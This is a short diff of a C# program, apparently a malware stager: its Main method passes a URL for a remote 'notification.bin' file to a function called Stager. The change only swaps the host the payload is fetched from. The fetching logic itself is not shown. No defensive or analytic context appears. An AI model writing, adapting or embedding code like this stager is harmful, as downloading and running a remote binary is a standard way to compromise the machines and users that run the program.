@@ -28,7 +28,7 @@ public class Program
 
     public static void Main()
     {
-        string url = "https://bloggins.ca/notification.bin";
+        string url = "https://xyz.ca/notification.bin";
         Stager(url);
     }
 
@@ -86,3 +86,4 @@ public class Program
         }
     }
 }
+
